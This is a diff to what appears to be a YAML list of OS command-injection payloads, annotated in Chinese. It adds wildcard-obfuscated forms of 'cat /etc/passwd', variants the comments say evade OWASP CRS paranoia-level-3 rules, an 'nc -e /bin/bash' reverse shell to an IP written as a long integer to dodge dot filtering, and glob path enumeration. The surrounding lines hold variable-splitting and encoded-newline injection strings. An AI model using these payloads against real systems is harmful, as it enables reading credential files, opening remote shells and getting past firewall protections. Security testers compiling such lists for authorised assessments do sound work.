@@ -49,9 +49,12 @@ payloads:
     - "a=ca;b=t; /$a$b /etc/passwd"
 
   wildcard:
-    - "/???/???  # = /bin/cat 或类似"
-    - "cat /???/???????  # = cat /etc/passwd"
+    - "/???/??t /???/??ss??  # cat /etc/passwd；? 单字符，不用 *（SQL 注释常被拦）"
+    - "/?in/cat+/et?/passw?  # 仅 3 个?，躲 CRS PL3 重复元字符"
+    - "/???/?s  # /bin/ls"
+    - "/???/n? -e /???/b??h 2130706433 1337  # nc；长整型 IP 避开点号"
     - "/usr/bin/who*mi"
+    - "echo /*/*ss*  # glob 枚举路径"
 
   newline_injection:
     - "foo%0awhoami  # URL编码换行"
